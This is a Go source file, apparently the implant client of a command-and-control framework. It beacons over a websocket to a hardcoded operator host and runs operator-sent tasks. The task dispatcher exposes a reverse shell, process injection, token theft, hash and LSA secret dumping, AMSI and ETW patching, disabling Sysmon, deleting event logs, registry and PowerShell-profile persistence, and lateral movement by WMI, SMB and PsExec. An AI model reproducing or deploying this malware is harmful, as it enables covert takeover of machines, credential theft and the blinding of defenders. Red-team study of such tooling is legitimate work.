package client

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
	"github.com/latortuga71/wsC2/internal/data"
	"github.com/latortuga71/wsC2/internal/modules/basic"
	"github.com/latortuga71/wsC2/internal/modules/credentials/dumpprocess"
	"github.com/latortuga71/wsC2/internal/modules/credentials/dumpsecrets"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/enumlocaluser"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/env"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/ifconfig"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/listports"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/listservices"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/listshares"
	"github.com/latortuga71/wsC2/internal/modules/enumeration/screenshot"
	"github.com/latortuga71/wsC2/internal/modules/evasion/cleareventlog"
	"github.com/latortuga71/wsC2/internal/modules/evasion/patchamsi"
	"github.com/latortuga71/wsC2/internal/modules/evasion/patchetw"
	"github.com/latortuga71/wsC2/internal/modules/evasion/patchsysmon"
	"github.com/latortuga71/wsC2/internal/modules/evasion/unhookntdll"
	"github.com/latortuga71/wsC2/internal/modules/execution/createprocess"
	"github.com/latortuga71/wsC2/internal/modules/execution/processinjection"
	"github.com/latortuga71/wsC2/internal/modules/execution/reverseshell"
	"github.com/latortuga71/wsC2/internal/modules/execution/runbinary"
	"github.com/latortuga71/wsC2/internal/modules/impersonation/enableprivilege"
	"github.com/latortuga71/wsC2/internal/modules/impersonation/enumtokens"
	"github.com/latortuga71/wsC2/internal/modules/impersonation/getsystem"
	"github.com/latortuga71/wsC2/internal/modules/impersonation/rev2self"
	"github.com/latortuga71/wsC2/internal/modules/impersonation/stealtoken"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/admincheck"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/exectools"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/portforward"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/scanner"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/scheduledtasks"
	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/services"
	"github.com/latortuga71/wsC2/internal/modules/persistence/logonscript"
	"github.com/latortuga71/wsC2/internal/modules/persistence/powershellprofile"
	"github.com/latortuga71/wsC2/internal/modules/persistence/runkey"
	"github.com/latortuga71/wsC2/internal/modules/privilegeescalation/goup"
	"github.com/latortuga71/wsC2/internal/modules/privilegeescalation/shellhistory"
	"github.com/latortuga71/wsC2/internal/utils"
)

var CheckedInChan chan interface{}
var CheckedIn bool
var ClientDone chan interface{}
var ClientInterrupt chan os.Signal
var Client *data.Client
var ServerHostName string
var ServerSecret string

var clientCert string

var clientKey string

var caCert string

func init() {
	ServerHostName = "192.168.56.1"
	ServerSecret = "Test"
	CheckedIn = false
	CheckedInChan = make(chan interface{})
	ClientDone = make(chan interface{})          // Channel to indicate that the receiverHandler is done
	ClientInterrupt = make(chan os.Signal)       // Channel to listen for interrupt signal to terminate gracefully
	signal.Notify(ClientInterrupt, os.Interrupt) // Notify the interrupt channel for SIGINT
}

func InitializeClient() error {
	Client = data.NewClient()
	Client.ClientCaCertPool = x509.NewCertPool()
	Client.WSConn = nil
	//err := ClientAcquireCertificateFromDisk()
	err := ClientAcquireCertificate()
	if err != nil {
		return err
	}
	clientCertificate, err := tls.X509KeyPair([]byte(Client.ClientCertPEM), []byte(Client.ClientKeyPem))
	if err != nil {
		return err
	}
	ok := Client.ClientCaCertPool.AppendCertsFromPEM([]byte(Client.ClientRootCA))
	if !ok {
		return errors.New("could not load ca certificate.")
	}
	Client.ClientTLSCertificate = clientCertificate
	return nil
}

func ClientHandleTask(message []byte) (error, *data.TaskResult) {
	var result string
	var cmdError error
	var downloadTask bool
	var screenshotTask bool
	m := &data.Message{}
	t := &data.Task{}
	err := json.Unmarshal(message, m)
	err = json.Unmarshal(m.MessageData, t)
	if err != nil {
		log.Printf("Error Handling Task\n")
		return err, nil
	}
	switch t.Command {
	case "die":
		ClientInterrupt <- os.Interrupt
		result, cmdError = "Stopping", nil
	case "pwd":
		result, cmdError = basic.PrintWorkingDirectory()
	case "cd":
		result, cmdError = basic.ChangeDirectory(t.Args[0])
	case "ls":
		result, cmdError = basic.ListDirectory(t.Args[0])
	case "touch":
		result, cmdError = basic.Touch(t.Args)
	case "reverse-shell":
		result, cmdError = reverseshell.ReverseShell(t.Args)
	case "download":
		result, cmdError = basic.DownloadFile(t.Args[0])
		downloadTask = true
	case "upload":
		if t.File == nil {
			cmdError = errors.New("No File Sent.")
			break
		}
		result, cmdError = basic.UploadFile(t.File, t.Args[0])
	case "mkdir":
		result, cmdError = basic.CreateDirectory(t.Args[0])
	case "rmdir":
		result, cmdError = basic.DeleteDirectory(t.Args[0])
	case "killproc":
		result, cmdError = basic.KillProcess(t.Args[0])
	case "ifconfig":
		result, cmdError = ifconfig.Ifconfig()
	case "env":
		result, cmdError = env.PrintEnv()
	case "ps":
		result, cmdError = basic.ListProcesses()
	case "self-inject":
		result, cmdError = processinjection.SelfInject(t.File)
	case "raw-self-inject":
		result, cmdError = processinjection.RawSelfInject(t.File)
	case "remote-inject":
		result, cmdError = processinjection.RemoteInject(t.File, t.Args[1])
	case "spawn-inject":
		result, cmdError = processinjection.SpawnInject(t.File, t.Args[1])
	case "spawn-inject-pipe":
		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args[1])
	case "screenshot":
		result, cmdError = screenshot.Screenshot()
		screenshotTask = true
	case "runas-netonly":
		result, cmdError = runbinary.RunAsNetOnly(t.Args)
	case "runas":
		result, cmdError = runbinary.RunAs(t.Args)
	case "run":
		result, cmdError = runbinary.RunBinary(t.Args)
	case "whoami":
		result, cmdError = basic.WhoAmI()
	case "rev2self":
		result, cmdError = rev2self.Rev2Self()
	case "patch-etw":
		result, cmdError = patchetw.PatchEtw()
	case "patch-amsi":
		result, cmdError = patchamsi.PatchAmsi()
	case "remote-download":
		result, cmdError = basic.RemoteDownload(t.Args)
	case "steal-token":
		result, cmdError = stealtoken.StealProcessToken(t.Args[0])
	case "cat":
		result, cmdError = basic.CatFile(t.Args[0])
	case "create-process-pid":
		result, cmdError = createprocess.CreateProcessWithTokenViaPid(t.Args)
	case "create-process-creds":
		result, cmdError = createprocess.CreateProcessWithTokenViaCreds(t.Args)
	case "run-key":
		result, cmdError = runkey.RegistryRunKeyPersist(t.Args)
	case "logon-script":
		result, cmdError = logonscript.LogonScriptPersist(t.Args)
	case "list-services":
		result, cmdError = listservices.ListServices()
	case "unhook-ntdll":
		result, cmdError = unhookntdll.UnhookNtdll()
	case "chisel":
		result, cmdError = "", errors.New("Will probably need to resort to sharp chisel (donut) or chisel (donut) ")
		//result, cmdError = modules.ChiselClient(t.Args)
	case "get-system":
		result, cmdError = getsystem.GetSystem()
	case "enable-priv":
		result, cmdError = enableprivilege.EnablePriv(t.Args[0])
	case "enum-tokens":
		result, cmdError = enumtokens.EnumTokens()
	case "port-forward":
		result, cmdError = portforward.PortForward(t.Args)
	case "revert-port-forward":
		result, cmdError = portforward.RevertPortForward()
	case "dump-process":
		result, cmdError = dumpprocess.MiniDumpProcess(t.Args)
	case "dump-hashes":
		result, cmdError = dumpsecrets.DumpHashes()
	case "dump-lsa":
		result, cmdError = dumpsecrets.DumpLsaSecrets()
	case "enum-users":
		result, cmdError = enumlocaluser.EnumUsers()
	case "enum-groups":
		result, cmdError = enumlocaluser.EnumGroups()
	case "enum-domain":
		result, cmdError = enumlocaluser.EnumDomain()
	case "admin-check":
		result, cmdError = admincheck.AdminCheck(t.Args[0])
	case "disable-sysmon":
		result, cmdError = patchsysmon.DisableSysmon()
	case "create-service":
		result, cmdError = services.CreateService(t.Args)
	case "delete-service":
		result, cmdError = services.DeleteService(t.Args)
	case "start-service":
		result, cmdError = services.StartService(t.Args)
	case "stop-service":
		result, cmdError = services.StopService(t.Args)
	case "list-ports":
		result, cmdError = listports.ListPorts()
	case "delete-event-log":
		result, cmdError = cleareventlog.DeleteEventLog(t.Args[0])
	case "create-scheduled-task":
		result, cmdError = scheduledtasks.CreateScheduledTask(t.Args)
	case "execute-scheduled-task":
		result, cmdError = scheduledtasks.ExecuteScheduledTask(t.Args)
	case "delete-scheduled-task":
		result, cmdError = scheduledtasks.DeleteScheduledTask(t.Args)
	case "powershell-profile":
		result, cmdError = powershellprofile.PowershellProfilePersistence(t.Args[0])
	case "port-scan":
		result, cmdError = scanner.PortScan(t.Args[0])
	case "subnet-scan":
		result, cmdError = scanner.SubnetScan(t.Args[0])
	case "wmi-exec":
		result, cmdError = exectools.WmiExec(t.Args)
	case "smb-exec":
		result, cmdError = exectools.SmbExec(t.Args)
	case "ps-exec":
		result, cmdError = exectools.PsExec(t.Args)
	case "list-shares":
		result, cmdError = listshares.ListShares(t.Args)
	case "shell-history":
		result, cmdError = shellhistory.GetShellHistory()
	case "go-up":
		result, cmdError = goup.AllChecks()
	default:
		result, cmdError = basic.ShellCommand(t.Args)
	}
	if t.Command != "shell" {
		result += "\n" // makes output a little better
	}
	if cmdError != nil {
		return nil, &data.TaskResult{
			ClientId:   t.ClientId,
			OperatorId: t.OperatorId,
			Result:     cmdError.Error(),
		}
	}
	// so operator knows not to print the base64 lol
	if screenshotTask {
		return nil, &data.TaskResult{
			ClientId:   t.ClientId,
			OperatorId: t.OperatorId,
			Result:     result,
			TaskId:     "ScreenshotTask",
		}
	}
	if downloadTask {
		return nil, &data.TaskResult{
			ClientId:   t.ClientId,
			OperatorId: t.OperatorId,
			Result:     result,
			TaskId:     "DownloadTask",
		}
	}
	return nil, &data.TaskResult{
		ClientId:   t.ClientId,
		OperatorId: t.OperatorId,
		Result:     result,
	}
}

func ClientHandleCheckInResp(message []byte) (error, string) {
	m := &data.Message{}
	c := &data.Client{}
	err := json.Unmarshal(message, m)
	if err != nil {
		return err, ""
	}
	err = json.Unmarshal(m.MessageData, c)
	if err != nil {
		return err, ""
	}
	return nil, c.ClientId
}

func ClientDoCheckIn(client *data.Client) error {
	checkInMessage := data.Message{
		MessageType: "CheckIn",
		MessageData: client.ToBytes(),
	}
	err := client.WSConn.WriteMessage(checkInMessage.ToBytes())
	if err != nil {
		return err
	}
	go func() {
		time.Sleep(time.Second * 30)
		if !CheckedIn {
			client.WSConn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			log.Fatal(errors.New("Failed to check in."))
		}
	}()
	<-CheckedInChan
	CheckedIn = true
	return nil
}

func ClientReceiveHandler(client *data.Client) {
	//https://morsmachine.dk/go-scheduler
	// locking thread to keep thread impersonations working.
	runtime.LockOSThread()
	connection := client.WSConn
	for {
		msg, err := connection.ReadMessage()
		if err != nil {
			ClientInterrupt <- os.Interrupt
			break
		}
		err, messageType := utils.CheckMessage(msg)
		switch messageType {
		case "CheckIn":
			err, uuid := ClientHandleCheckInResp(msg)
			if err != nil {
				log.Fatal(err)
			}
			Client.ClientId = uuid
			CheckedInChan <- true
		case "Task":
			err, res := ClientHandleTask(msg)
			if err != nil {
				log.Fatal(err)
			}
			d := data.Message{
				MessageType: "TaskResult",
				MessageData: res.ToBytes(),
			}
			connection.WriteMessage(d.ToBytes())
			// handle tasks async ??? doable but idk needs more testing.
			// might be better to be patient as well.
			// this breaks impersonation. casue of threads
			/*
				go func() {
					err, res := ClientHandleTask(msg)
					if err != nil {
						log.Fatal(err)
					}
					d := data.Message{
						MessageType: "TaskResult",
						MessageData: res.ToBytes(),
					}
					connection.WriteMessage(d.ToBytes())
				}()
			*/
		default:
		}
	}
	runtime.UnlockOSThread()
}

func ClientAcquireCertificateFromDisk() error {
	Client.ClientCertPEM = clientCert
	Client.ClientKeyPem = clientKey
	Client.ClientRootCA = caCert
	return nil
}

func ClientAcquireCertificate() error {
	client := http.Client{
		Timeout: time.Minute * 3,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	certRequest := &data.CertRequest{
		SharedSecret: ServerSecret,
	}
	certBytes, err := json.Marshal(certRequest)
	if err != nil {
		log.Fatal(err)
	}
	endpoint := fmt.Sprintf("https://%s:80/about/contact", ServerHostName)
	r, err := client.Post(endpoint, "application/json", bytes.NewBuffer(certBytes))
	if err != nil {
		return err
	}
	certDataReturned := &data.CertRequest{}
	err = json.NewDecoder(r.Body).Decode(&certDataReturned)
	if err != nil {
		return err
	}
	decodedCert, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientCertificate)
	decodedKey, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientPrivateKey)
	decodedCa, err := base64.StdEncoding.DecodeString(certDataReturned.B64RootCaCertificate)
	if err != nil {
		return err
	}
	Client.ClientCertPEM = string(decodedCert)
	Client.ClientKeyPem = string(decodedKey)
	Client.ClientRootCA = string(decodedCa)
	return nil
}
